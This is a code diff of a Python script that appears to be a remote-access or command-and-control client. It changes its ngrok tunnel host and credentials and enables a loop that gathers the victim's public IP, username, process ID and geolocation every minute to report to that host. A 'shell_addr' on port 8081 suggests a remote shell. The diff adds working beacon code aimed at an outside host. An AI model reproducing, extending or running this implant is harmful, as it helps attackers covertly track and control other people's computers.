@@ -50,7 +50,7 @@ def show_geo(public_ip=None):
         return
 
 
-ip, port = ("acae-92-118-75-80.ngrok-free.app", 3333)
+ip, port = ("035e-92-118-74-46.ngrok-free.app", 3333)
 shell_addr = ("", 8081)
 
 # os.system('chcp 65001')
@@ -74,7 +74,7 @@ headers = {'Connection':'close'}
 
 url = 'https://' + ip + '/'
 # c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
-creds = ('user', 'pass')
+creds = ('user', 'pas')
 
 while True:
     if (requests.post(url, data=data, auth=creds, headers=headers)).status_code == 200:
@@ -84,21 +84,21 @@ while True:
 time.sleep(1)
 print('ok')
 
-#
-# while True:
-#     try:
-#         time.sleep(60)
-#         client_ip = get("http://api.ipify.org").text
-#         data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
-#                 'pid': str(os.getpid()), 'ip': client_ip,
-#                 "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
-#         headers = {'Connection': 'close'}
-#
-#         url = 'https://' + ip + '/'
-#         creds = ('user', 'pass')
-#
-#         print("send")
-#     except requests.exceptions.ConnectionError:
-#         pass
 
-subprocess.Popen("python client.py")
+while True:
+    try:
+        time.sleep(60)
+        client_ip = get("http://api.ipify.org").text
+        data = {"port": port, "alias": alias, "status": "update", "user": subprocess.getoutput('whoami'),
+                'pid': str(os.getpid()), 'ip': client_ip,
+                "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1]}
+        headers = {'Connection': 'close'}
+
+        url = 'https://' + ip + '/'
+        creds = ('user', 'pass')
+
+        print("send")
+    except requests.exceptions.ConnectionError:
+        pass
+
+# subprocess.Popen("python client.py")
